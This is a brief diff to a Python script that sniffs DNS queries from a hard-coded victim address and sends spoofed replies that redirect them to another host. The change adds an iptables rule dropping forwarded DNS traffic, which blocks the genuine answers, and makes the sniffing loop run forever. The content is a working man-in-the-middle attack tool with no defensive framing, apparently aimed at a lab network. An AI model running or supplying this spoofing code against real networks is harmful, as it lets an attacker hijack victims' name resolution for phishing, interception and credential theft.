@@ -4,6 +4,8 @@ from subprocess import Popen, PIPE
 victimIP = "10.5.1.2"
 gotoIP = "10.5.1.3"
 
+Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
+
 
 def sniffDNS():
 	sniff(filter="udp and port 53 and host " + victimIP, prn = spoofDNS)
@@ -15,8 +17,7 @@ def spoofDNS(packet):
             sendp(spoof, count=1)
 
 
-if __name__ == '__main__':
-    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
-    #sniffDNS()
+while True:
+    sniffDNS()
 
     
